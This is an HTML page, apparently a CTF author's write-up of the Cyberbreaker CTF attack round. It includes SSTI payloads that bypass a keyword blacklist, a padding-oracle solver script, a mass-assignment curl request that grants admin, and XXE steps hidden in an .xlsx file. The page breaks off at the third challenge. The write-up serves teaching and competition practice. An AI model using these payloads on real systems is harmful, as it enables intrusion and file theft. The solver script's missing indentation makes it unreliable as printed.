@@ -1,0 +1,1505 @@
+ <!doctype html>
+<html lang="en" data-bs-theme="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    <meta property="og:title" content="Cyber-breaker CTF (Attack Session) Solver Scripts & Documentation" />
+    <meta property="og:description" content="Solver scripts for Binary Exploitation and Web Security challenges" />
+    <meta property="og:url" content="https://w333zard.my.id" />
+    <meta
+      property="og:image"
+      content="https://i.pinimg.com/736x/a9/d8/d4/a9d8d4e03e8251836546c97948609687.jpg"
+    />
+
+    <title>Cyber-breaker CTF (Attack Session) Writeup Documentation</title>
+    <script src="assets/js/vendors/color-modes.js"></script>
+    <!-- Favicon icon-->
+    <link rel="shortcut icon" type="image/x-icon" href="assets/imgs/template/favicon.svg">
+    <!-- Libs CSS -->
+    <link rel="stylesheet" href="assets/css/vendors/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/vendors/swiper-bundle.min.css">
+    <link rel="stylesheet" href="assets/css/vendors/aos.css">
+    <link rel="stylesheet" href="assets/css/vendors/odometer.css">
+    <link rel="stylesheet" href="assets/css/vendors/carouselTicker.css">
+    <link rel="stylesheet" href="assets/css/vendors/magnific-popup.css">
+    <link rel="stylesheet" href="assets/fonts/remixicon/remixicon.css">
+    <link rel="stylesheet" href="assets/fonts/satoshi/satoshi.css">
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@300;400;500&family=Playfair+Display:wght@400..900&family=Urbanist:wght@100..900&display=swap" rel="stylesheet">
+   
+    <!-- In your HTML head -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <!-- Initialize -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            hljs.highlightAll();
+        });
+    </script>
+
+    <!-- Main CSS -->
+    <link rel="stylesheet" href="assets/css/main.css">
+    <link rel="stylesheet" href="assets/css/Wzrd.css">
+    <link rel="stylesheet" href="assets/css/blog-styles.css">
+
+
+</head>
+
+<body>
+    <!-- prettier-ignore -->
+
+    <!-- Navbar -->
+    <header>
+        <nav class="navbar navbar-expand-lg navbar-light w-100 flex-nowrap z-999 p-0">
+            <a href="#" class="navbar-menu p-4 text-center square-100 menu-tigger icon_80 icon-shape d-none d-md-flex" data-bs-target=".offCanvas__info" aria-controls="offCanvas__info">
+                <i class="ri-menu-2-line"></i>
+            </a>
+            <div class="container py-3 px-0">
+                <a class="navbar-brand d-flex main-logo align-items-center ms-lg-0 ms-md-5 ms-3" href="index.html">
+                    <img src="assets/imgs/template/favicon.svg" alt="zelio" />
+                    <span class="fs-4 ms-2">w333zard</span>
+                </a>
+                <div class="d-none d-lg-flex">
+                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                            <li class="nav-item">
+                                <a class="nav-link active" href="index.html">Home</a>
+                            </li>
+
+                            <li class="nav-item">
+                                <a class="nav-link" href="index.html#skills">Skills</a>
+                            </li>
+
+                            <li class="nav-item">
+                                <a class="nav-link" href="index.html#portfolio">Portfolio</a>
+                            </li>
+
+                            <li class="nav-item">
+                                <a class="nav-link" href="index.html#blog">Blog</a>
+                            </li>
+                            
+                            <li class="nav-item">
+                                <a class="nav-link" href="index.html#projects">Projects</a>
+                            </li>
+
+                            <li class="nav-item">
+                                <a class="nav-link" href="index.html#contact">Contact</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="navbar-social d-flex align-items-center pe-5 pe-lg-0 me-5 me-lg-0">
+                    <div class="d-md-flex d-none gap-3">
+                        <a href="https://www.instagram.com/rfdhaikal.wizz/">
+                            <i class="ri-instagram-fill"></i>
+                        </a>
+                        <a href="https://medium.com/@w333zard">
+                            <i class="ri-medium-fill"></i>
+                        </a>
+                        <a href="https://www.linkedin.com/in/rfdhaikal/">
+                            <i class="ri-linkedin-fill"></i>
+                        </a>
+                        <a href="https://github.com/W-zrd">
+                            <i class="ri-github-fill"></i>
+                        </a>
+                    </div>
+                    <div class="burger-icon burger-icon-white border rounded-3">
+                        <span class="burger-icon-top"></span>
+                        <span class="burger-icon-mid"></span>
+                        <span class="burger-icon-bottom"></span>
+                    </div>
+                </div>
+            </div>
+            <div class="dark-light-switcher pe-10 pe-lg-0 pe-0 ps-md-5 ps-0 ps-lg-4 pe-lg-4 d-flex justify-content-center align-items-center icon_80 @@classList">
+                <i class="ri-sun-fill text-warning"></i>
+                <i class="ri-contrast-2-line text-white"></i>
+            </div>
+
+        </nav>
+        <!-- offCanvas-menu -->
+        <div class="offCanvas__info">
+            <div class="offCanvas__close-icon menu-close">
+                <button><i class="ri-close-line"></i></button>
+            </div>
+            <div class="offCanvas__logo mb-5">
+                <h3 class="mb-0">Get in touch</h3>
+            </div>
+            <div class="offCanvas__side-info mb-30">
+                <div class="contact-list mb-30">
+                    <p class="fs-6 fw-medium text-200 mb-5">Offense in depth; better take your data back to offline mode.</p>
+                    <div class="mb-3">
+                        <span class="text-400 fs-5">LinkedIn</span>
+                        <p class="mb-0">https://www.linkedin.com/in/rfdhaikal/</p>
+                    </div>
+                    <div class="mb-3">
+                        <span class="text-400 fs-5">Email</span>
+                        <p class="mb-0">rfdhaikal.wizz@proton.me</p>
+                    </div>
+                    <div class="mb-3">
+                        <span class="text-400 fs-5">GitHub</span>
+                        <p class="mb-0">https://github.com/W-zrd</p>
+                    </div>
+                </div>
+
+                <div class="contact-list">
+                    <p class="text-400 fs-5 mb-2">Social</p>
+                    <div class="d-md-flex d-none gap-3">
+                        <a href="https://www.instagram.com/rfdhaikal.wizz/">
+                            <i class="ri-instagram-fill fs-18"></i>
+                        </a>
+                        <a href="https://medium.com/@w333zard">
+                            <i class="ri-medium-fill fs-18"></i>
+                        </a>
+                        <a href="https://www.linkedin.com/in/rfdhaikal/">
+                            <i class="ri-linkedin-fill fs-18"></i>
+                        </a>
+                        <a href="https://github.com/W-zrd">
+                            <i class="ri-github-fill fs-18"></i>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="offCanvas__overly"></div>
+        <div class="mobile-header-active mobile-header-wrapper-style perfect-scrollbar button-bg-2">
+            <div class="mobile-header-wrapper-inner">
+                <div class="mobile-header-logo">
+                    <a class="d-flex main-logo align-items-center d-inline-flex" href="index.html">
+                        <img src="assets/imgs/footer-1/logo.svg" alt="zelio" />
+                        <span class="fs-4 ms-2 text-dark">w333zard</span>
+                    </a>
+                    <div class="burger-icon burger-icon-white border rounded-3">
+                        <span class="burger-icon-top"></span>
+                        <span class="burger-icon-mid"></span>
+                        <span class="burger-icon-bottom"></span>
+                    </div>
+                </div>
+                <div class="mobile-header-content-area">
+                    <div class="perfect-scroll">
+                        <div class="mobile-menu-wrap mobile-header-border">
+                            <nav>
+                                <ul class="mobile-menu font-heading ps-0">
+                                    <li class="nav-item">
+                                        <a class="nav-link active" href="index.html">Home</a>
+                                    </li>
+
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="index.html#skills">Skills</a>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="index.html#portfolio">Portfolio</a>
+                                    </li>
+
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="index.html#blog">Blog</a>
+                                    </li>
+
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="index.html#projects">Projects</a>
+                                    </li>
+                                    <li class="nav-item">
+                                        <a class="nav-link" href="index.html#contact">Contact</a>
+                                    </li>
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </header>
+
+    <main>
+        <!-- prettier-ignore -->
+        <!-- blog details -->
+        <section class="section-details pt-60 pb-100">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-10 mx-lg-auto mb-3">
+                        <div class="text-center">
+                            <a href="#" class="btn btn-gradient d-inline-block text-uppercase"> Offensive Security </a>
+                            <h3 class="ds-3 mt-3 mb-3 text-dark">Cyberbreaker CTF - Attack Session Writeup Documentation</h3>
+                            <p class="text-300 fs-5 mb-0">
+                                Solver scripts for Binary Exploitation and Web Security challenges
+                            </p>
+                            <div class="d-flex align-items-center my-4">
+                                <img class="" style="width:1200px;" src="assets/imgs/blog/blog-3/cover.jpg" alt="" />
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-lg-10 mx-lg-auto">
+                        <div class="row">
+                            <div class="col-lg-8 blog-content">
+                                <h3>Introduction</h3>
+                                <p>
+                                CBC Final Round - Binary & Web Exploitation Writeup
+                                </p>
+
+                                <div class="mt-4">
+                                    <div class="bg-primary bg-opacity-10 border border-primary border-opacity-25 rounded-4 p-4">
+                                        <div class="d-flex align-items-center mb-3">
+                                            <i class="ri-list-check-2 fs-5 text-primary me-2"></i>
+                                            <h5 class="mb-0 text-primary">List of Challenges</h5>
+                                        </div>
+                                        <ol class="list-unstyled mb-0">
+                                            <li class="mb-2">
+                                                <a href="#bl1tz" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Bl1tz</strong> <span class="text-muted">(Padding Oracle Attack + SSTI + LFI)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#e-market" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>E-Market</strong> <span class="text-muted">(Mass Assignment + XXE Injection on Excel File)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#starting-point" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Starting Point</strong> <span class="text-muted">(Return-oriented Programming)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#ncurse" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Ncurse</strong> <span class="text-muted">(Binary Exploitation)</span></span>
+                                                </a>
+                                            </li>
+                                            <li class="mb-2">
+                                                <a href="#bl1zzard" class="text-decoration-none d-flex align-items-center p-2 rounded-3 hover-bg-opacity-10 transition-all toc-link">
+                                                    <i class="ri-arrow-right-s-line text-primary me-2 transition-all"></i>
+                                                    <span><strong>Bl1zzard</strong> <span class="text-muted">(Web Reversing Logic)</span></span>
+                                                </a>
+                                            </li>
+                                        </ol>
+                                    </div>
+                                </div>
+
+                                <div class="mt-5">
+                                    
+                                    <div class="mt-4">
+                                        <h4 id="bl1tz">1. Bl1tz (Hard)</h4>
+                                        
+                                        <div class="challenge-summary">
+                                            <div class="summary-grid">
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Difficulty</p>
+                                                    <span class="difficulty-hard">Hard</span>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Category</p>
+                                                    <p class="summary-value">Web Exploitation+Cryptography</p>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Topic</p>
+                                                    <p class="summary-value">Padding Oracle + SSTI + LFI</p>
+                                                </div>
+                                            </div>
+                                            <div class="flag-container">
+                                                <p class="flag-text">CBD{bl1tz_n_l337_ur_bra1n_tiltz_h3h3h3_hckd_by_Wzrd}</p>
+                                                <button class="flag-copy-btn" onclick="copyFlag(this)">
+                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Copy</span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        
+                                        <p>Bl1tz is an e-commerce website which has 2 user roles: public unauthenticated users with less capabilities, and admin users with access to a management dashboard. The challenge description provides a hint by mentioning that "a hacker successfully logged in as an Admin" which guides us toward the goal of accessing admin functionality to get the flag. But actually it's not that easy because the current role we have now is just a public user (unauthenticated) with less capabilities. We need a way to login as admin.</p>
+
+                                        <p>There are several user input in Bl1tz web target such as search bar, upload file, and customer chat bot. While the search bar reflects user input, it already has secure implementation by removing any malicious pattern given by the user. So we dont need to care about the Search bar. We need another injection point that reflects or stores user input.</p>
+
+                                        <p>The upload file functionality is likely vulnerable to some kind of bug because it will store our given payload to the server. But for now, since we dont know where the uploaded file is stored, it's useless. So the last thing that reflects user input is the customer chat bot. When users report issues through the chat interface, their input is directly embedded into a Python Jinja2 template without proper sanitization. This will cause any template syntax within the user's message to be executed as code rather than treated as plain text. But there are several blocked characters implemented by the app, and we need to avoid them:</p>
+
+                                        <pre><code>blocked_chars = ['__import__', 'exec', 'eval', 'subprocess', 'system', 'popen', 'chr', 'os', '__globals__', '__builtins__', 'read', 'listdir', '/', '..']</code></pre>
+                                        
+                                        <h5>Solutions</h5>
+                                        <p>
+                                            To exploit the Server-side Template Injection (SSTI), you must first bypass the implemented blacklist. Navigate to the chat interface, select the "Report Issue" option, and craft payloads that use string concatenation to bypass filters. Here is my payload for initial reconnaissance to explore directory content lists.
+                                        </p>
+
+                                        <pre><code>{{ cycler.__init__.__getattribute__('__glob'+'als__')['__buil'+'tins__']['__imp'+'ort__']('o'+'s')['list'+'dir']('.') }}</code></pre>
+
+                                        <p>This payload imports the OS module by accessing Python's built-in functions through Jinja2's context objects. When we explore all files and directories, there is a flag stored at <code>/flag.txt</code> path, but we can't open/read it because it has root permission. So instead of trying to retrieve the flag, our goal is to open <code>setup.sql</code> file which contains admin credentials that can be used to login as admin. Don't forget to use unicode character to encode the <code>/</code> sign due to character restriction implemented by the app.</p>
+                                        <pre><code class="language-python">{{ joiner.__init__.__getattribute__('__glob'+'als__')['__buil'+'tins__']['op'+'en']('src'+'\u002f'+'setup.sql','r').readlines() }}</code></pre>
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/1.png" alt="" />
+                                        </div>
+
+
+                                    <p>After we discovered the admin credentials, we can login as admin to find another vulnerability in order to get the flag. From our previous exploration, we know that the file upload functionality on the Contact page is likely vulnerable because it will store our given file to the server. Now since we have an Admin privilege, we can know where the uploaded file will be stored. We can test this by uploading any file just to try to see the app behavior.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                        <img class="" src="assets/imgs/blog/blog-4/3.png" alt="" />
+                                    </div>
+                                    
+                                    <p>When we upload a file named <code>sample.pdf</code>, it can be accessed by the admin via <code>/view?id={random_value}</code> where the <code>random_value</code> is our uploaded file name. Actually it's not so random because if we upload the same file name, it will also generates the same <code>random_value</code>. Moreover, if we pass any value by ourselves, it will return an error says <code>Invalid ciphertext block size</code> which indicates Padding Oracle Vulnerability. From this, we could expect that each file name might be encrypted by some algorithm that generates this <code>random_value</code>.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                        <img class="" src="assets/imgs/blog/blog-4/4.png" alt="" />
+                                    </div>
+                                    
+                                    <p>Now since we found the Server-side Template Injection (SSTI) finding from our previous steps, we can use it to discover all the web target file and its source code to try to find something interesting related to how this app generates the <code>random_value</code>. After the discovery, there is a file called <code>./src/utils/crypto.py</code> which encrypts every user-uploaded file in the contact form. Here is the related <code>crypto.py</code> file</p>
+
+                                    <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64
+
+class PaddingOracle:
+    def __init__(self, key=None):
+        if key is None:
+            key = b'YELLOW_SUBMARINE'
+        self.key = key
+        self.iv_size = AES.block_size
+    
+    def encrypt(self, plaintext):
+        if isinstance(plaintext, str):
+            plaintext = plaintext.encode('utf-8')
+        
+        iv = os.urandom(self.iv_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        padded_data = pad(plaintext, AES.block_size)
+        ciphertext = cipher.encrypt(padded_data)
+        
+        combined = iv + ciphertext
+        return base64.b64encode(combined).decode('ascii').replace('/', '_').replace('+', '-').replace('=', '')</code></pre>
+                                            </div>
+                                    </div>
+
+                                    <p>This encryption algorithm works by using AES in CBC (Cipher Block Chaining) mode with PKCS#7 padding. When a plaintext is given, it is first converted into bytes and padded to fit AES’s block size. Then, a random initialization vector (IV) is generated to ensure that even identical plaintexts produce different ciphertexts. The plaintext is encrypted using the AES key and IV, and the IV is prepended to the ciphertext. Finally, the result is encoded in a modified base64 format.</p>
+
+                                    <p>Now we need to reverse the encryption process by making a final solver script to decrypt them. For decryption, the process reverses these steps. The encoded ciphertext is first normalized back into standard base64 and decoded into bytes. The IV is extracted from the beginning, and the remaining part is the ciphertext. Using the same key and IV, the ciphertext is decrypted, producing padded plaintext. The padding is then removed to recover the original message. If any error occurs, such as incorrect padding or invalid block size, the algorithm raises an error to signal corruption or tampering in the ciphertext.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                        <img class="" src="assets/imgs/blog/blog-4/5.png" alt="" />
+                                    </div>
+                                        
+                                    <div class="code-container">
+                                        <div class="code-content">
+                                            <div class="code-controls">
+                                                <div class="code-language">
+                                                    <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Python</span>
+                                                </div>
+                                                <button class="copy-btn" onclick="copyCode(this)">
+                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Copy</span>
+                                                </button>
+                                            </div>
+                                            <pre><code class="language-python">#!/usr/bin/env python3
+import os
+import sys
+import base64
+import argparse
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+class PaddingOracle:
+def __init__(self, key=None):
+    if key is None:
+        key = b'YELLOW_SUBMARINE'
+    self.key = key
+    self.iv_size = AES.block_size
+
+def encrypt(self, plaintext):
+    if isinstance(plaintext, str):
+        plaintext = plaintext.encode('utf-8')
+    
+    iv = os.urandom(self.iv_size)
+    cipher = AES.new(self.key, AES.MODE_CBC, iv)
+    padded_data = pad(plaintext, AES.block_size)
+    ciphertext = cipher.encrypt(padded_data)
+    
+    combined = iv + ciphertext
+    return base64.b64encode(combined).decode('ascii').replace('/', '_').replace('+', '-').replace('=', '')
+
+def decrypt(self, encrypted_data):
+    try:
+        encrypted_data = encrypted_data.replace('_', '/').replace('-', '+')
+        while len(encrypted_data) % 4:
+            encrypted_data += '='
+        
+        combined = base64.b64decode(encrypted_data)
+        
+        if len(combined) < self.iv_size:
+            raise ValueError("Invalid ciphertext length")
+        
+        iv = combined[:self.iv_size]
+        ciphertext = combined[self.iv_size:]
+        
+        if len(ciphertext) % AES.block_size != 0:
+            raise ValueError("Invalid ciphertext block size")
+        
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        padded_data = cipher.decrypt(ciphertext)
+        
+        plaintext = unpad(padded_data, AES.block_size)
+        return plaintext.decode('utf-8')
+        
+    except Exception as e:
+        error_msg = str(e).lower()
+        if 'padding' in error_msg:
+            raise ValueError("Padding error")
+        elif 'invalid' in error_msg and ('length' in error_msg or 'block' in error_msg):
+            raise ValueError("Invalid format")
+        else:
+            raise ValueError("Decryption failed")
+
+def main():
+parser = argparse.ArgumentParser()
+parser.add_argument('mode', choices=['encrypt', 'decrypt'])
+parser.add_argument('data')
+parser.add_argument('--key')
+
+args = parser.parse_args()
+
+if args.key:
+    if len(args.key) != 16:
+        print("Error: Key must be exactly 16 bytes long")
+        sys.exit(1)
+    oracle = PaddingOracle(args.key.encode('utf-8'))
+else:
+    oracle = PaddingOracle()
+
+try:
+    if args.mode == 'encrypt':
+        result = oracle.encrypt(args.data)
+        print(f"Plaintext: {args.data}")
+        print(f"Encrypted: {result}")
+        print(f"URL: /view?id={result}")
+        
+    elif args.mode == 'decrypt':
+        result = oracle.decrypt(args.data)
+        print(f"Encrypted: {args.data}")
+        print(f"Decrypted: {result}")
+        
+except ValueError as e:
+    print(f"Error: {e}")
+    sys.exit(1)
+
+def interactive_mode():
+oracle = PaddingOracle()
+print("Commands: encrypt <text>, decrypt <cipher>, quit")
+print()
+
+while True:
+    try:
+        command = input("> ").strip()
+        
+        if command.lower() in ['quit', 'exit', 'q']:
+            break
+        
+        if command.startswith('encrypt '):
+            plaintext = command[8:]
+            encrypted = oracle.encrypt(plaintext)
+            print(f"Encrypted: {encrypted}")
+            print(f"URL: /view?id={encrypted}")
+            
+        elif command.startswith('decrypt '):
+            ciphertext = command[8:]
+            try:
+                decrypted = oracle.decrypt(ciphertext)
+                print(f"Decrypted: {decrypted}")
+            except ValueError as e:
+                print(f"Decryption failed: {e}")
+                            
+        else:
+            print("Usage: encrypt <text> | decrypt <cipher> | quit")
+            
+    except KeyboardInterrupt:
+        print("\nBye!")
+        break
+    except EOFError:
+        break
+
+if __name__ == '__main__':
+if len(sys.argv) == 1:
+    interactive_mode()
+else:
+    main()</code></pre>
+                                        </div>
+                                    </div>
+                                    </div>
+
+                                    <p>Now copy the value of the previous random file name when we uploaded the <code>sample_pdf</code> file, and then decrypt it using the script above. You'll see that the decrypted result is actually the filename and its path. The next step is most likely about Local File Inclusion (LFI) vulnerability. And because we already know that the flag is stored on <code>/flag.txt</code> from our SSTI finding, we can just encrypt the text "/flag.txt", and pass it as the parameter value on <code>/view?id={encrypted_flag_path}</code> to get the flag.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                        <img class="" src="assets/imgs/blog/blog-4/6.png" alt="" />
+                                    </div>
+
+                                    <div class="mt-4">
+                                        <h4 id="e-market">2. E-Market (Hard)</h4>
+                                        
+                                        <div class="challenge-summary">
+                                            <div class="summary-grid">
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Difficulty</p>
+                                                    <span class="difficulty-hard">Hard</span>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Category</p>
+                                                    <p class="summary-value">Web Exploitation</p>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Topic</p>
+                                                    <p class="summary-value">Mass Assignment Vulnerability + XXE Injection on Excel File</p>
+                                                </div>
+                                            </div>
+                                            <div class="flag-container">
+                                                <p class="flag-text">CBD{1ts_n0t_4bout_XSS_k1ds!_h3h3h3_hckd_by_Wzrd}</p>
+                                                <button class="flag-copy-btn" onclick="copyFlag(this)">
+                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Copy</span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        
+                                        <p>In the next challenge, we are given an E-Commerce website which has Products and News posts. Unlike the previous challenge, we can register a new account there even though it doesnt have wide capabilities because it just a normal user role. The challenge was intended to be a Black Box Testing format and that's why the difficulty is set to hard. Almost all participants found it difficult to find the first bug. But when the first hint came down, the rest of the steps is quite easy to solve. So, after ±3 hours of attack session, me as the challenge author decided to drop a hint to the participants. The hint is telling the participants that the web target has 2 user roles. Just it, no more or less. From this, i assume the participants would know that their next steps would be about Privilege Escalation to an Admin to get wider capabilities.</p>
+
+                                        <p>Assuming that we have given a hint where there are 2 role in the web target, our next step is clear that we should escalate our privilege to an Admin. There are multiple injection points to try in order to check whether some functionality could escalates our privilege or not. The first one is in the Login page, the second is in the Register page, and the last one is on the Profile page. You'll need to do some trial and error of those component. After that you would know that the profile page is vulnerable to Mass Assignment vulnerability, especially in the update endpoint which can escalates our privilege to Admin level.</p>
+                                    
+                                        <h5>Solutions</h5>
+                                        
+                                        <p>When users update their account profile information, there is a <code>POST</code> request to an API endpoint which contains parameter or data provided by them. The vulnerable part of the app is the backend allowing the users to modify some value in the form that is intended to be immutable field (can't be editable). We can see these behaviour by modifying immutable field such as username, using HTTP Request or cUrl. You'll see that the app still accepting our request even if the field is immutable</p>
+
+                                        <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/7.png" alt="" />
+                                        </div>
+
+                                        <p>By using this finding, we can upgrade our privilege from User to Admin just by sending a cUrl request, and add <code>role</code> parameter in its request. After that, pass the <code>admin</code> as the value of that parameter. Here is the payload.</p>
+                                    <div class="code-container">
+                                            <div class="code-content">
+                                                <div class="code-controls">
+                                                    <div class="code-language">
+                                                        <i class="ri-code-s-slash-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Python</span>
+                                                    </div>
+                                                    <button class="copy-btn" onclick="copyCode(this)">
+                                                        <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                        <span>Copy</span>
+                                                    </button>
+                                                </div>
+                                                <pre><code class="language-python">curl -X POST "https://e-market.serv2.cbd2025.cloud/profile.php" \
+  -H "Cookie: PHPSESSID=UPDATE_ME" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "update=1&email=Wzrd@bl1tz.com&full_name=Wzrd&address=123 Test St&phone=555-0123&role=admin"</code></pre>
+                                            </div>
+                                    </div>
+                                    </div>
+
+                                    <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/8.png" alt="" />
+                                    </div>
+
+                                    <p>Now we've successfully manipulate our role to become an Admin, so what's next? Looking at the admin capabilities, this role can manage & create Products, News, and user' Orders. There are 2 type of user input in those menus: Input Form and File Upload component. In short, when you try to inject malicious payload in the input form, nothing happened. The input form has securely storing our input as a plain text rather than rendering it as a code. The file picker component on the Import Data feature is most likely vulnerable.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/9.png" alt="" />
+                                    </div>
+
+                                    <p>First of all, if you analyze the behaviour, this file upload functionality is only allows XLSX file because this component is used to input Products or News in massive amount of datas so the user doesnt have much effort to input them one by one. Second, we should match the intended row and column structure as provided on the web target, or else your Excel file wont be accepted by the app. Lastly, we can't manipulate the file extensions, content type, or even magic bytes in this component, so it's likely secure against RCE and File Upload Injection.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/10.png" alt="" />
+                                    </div>
+ 
+                                    <p>The next closest vulnerability that might occurs in an XLSX file upload feature is XML External Entity (XXE) Injection. XML (eXtensible Markup Language) is a format for structured data that uses tags, attributes, and a document structure, just like HTML. It let you define reusable pieces of text (entities) and specify document rules. Many XML parsers also let entities point to external resources (local files or URLs) so documents can include content from outside the file. And that is where our injection point lies.</p>
+
+                                    <p>XXE Injection happens when an attacker supplies XML to an application and the XML parser is allowed to resolve external entities. The attacker includes a payload that defines an external entity pointing to a sensitive resource (for example <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code>). When the parser processes the XML, it fetches that external content into the document. If the application returns the parsed content to the attacker, that attacker can read local files, query internal services, or in our case, the flag.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/xxe-injection.svg" alt="" />
+                                    </div>
+
+                                    <p>But how can we craft a payload to inject external entities in the .xlsx file to get the flag? Short answer: an .xlsx is just a ZIP archive full of XML files. We can create a malicious .xlsx where one of the XML parts contains a <code>&lt;!DOCTYPE&gt;</code> with an external entity declaration (e.g. pointing at file:///etc/flag.txt) and then references that entity inside the XML. For example: In Windows, when we open an .xlsx file, it will automatically opened with Ms. Excel app. But in Linux, we can actually open .xlsx file using a ZIP viewer/opener. And that's the starting point of making our XXE injection payload.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/11.png" alt="" />
+                                    </div>
+
+                                    <p>Here is the flow: Make a proper row and column format based on the provided structure in the web target, and save it as .xlsx. Then extract the .xlsx file using ZIP viewer or just execute <code>unzip payload.xlsx</code> on your terminal. You'll see <code>sharedStrings.xml</code> inside the <code>xl</code> folder. After that, inject <code>&lt;!ENTITY xxe SYSTEM "file:///flag.txt"&gt;</code> under the <code>&lt;!DOCTYPE root&gt;</code> section. The payload example would look like the image above. Finally, zip those files & folder generated by the previous unzip command by executing:
+
+                                    <pre><code class="language-python">zip -r payload.xlsx '[Content_Types].xml' _rels/ xl/</code></pre>
+
+                                    <p>Upload the xlsx payload on the web target and you'll get the flag.</p>
+
+                                    <div class="d-flex align-items-center my-2">
+                                            <img class="" src="assets/imgs/blog/blog-4/12.png" alt="" />
+                                    </div>
+
+                                    <div class="mt-4">
+                                        <h4 id="starting-point">3. Starting Point (Medium)</h4>
+                                        
+                                        <div class="challenge-summary">
+                                            <div class="summary-grid">
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Difficulty</p>
+                                                    <span class="difficulty-medium">Medium</span>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Category</p>
+                                                    <p class="summary-value">Binary Exploitation</p>
+                                                </div>
+                                                <div class="summary-item">
+                                                    <p class="summary-label">Topic</p>
+                                                    <p class="summary-value">Return-oriented Programming</p>
+                                                </div>
+                                            </div>
+                                            <div class="flag-container">
+                                                <p class="flag-text">CBD{ROP_ismuch_h4rd3r_th4n_OOP_h3h3h3_hckd_by_Wzrd}</p>
+                                                <button class="flag-copy-btn" onclick="copyFlag(this)">
+                                                    <i class="ri-file-copy-line" style="font-size: 0.6rem;"></i>
+                                                    <span>Copy</span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        
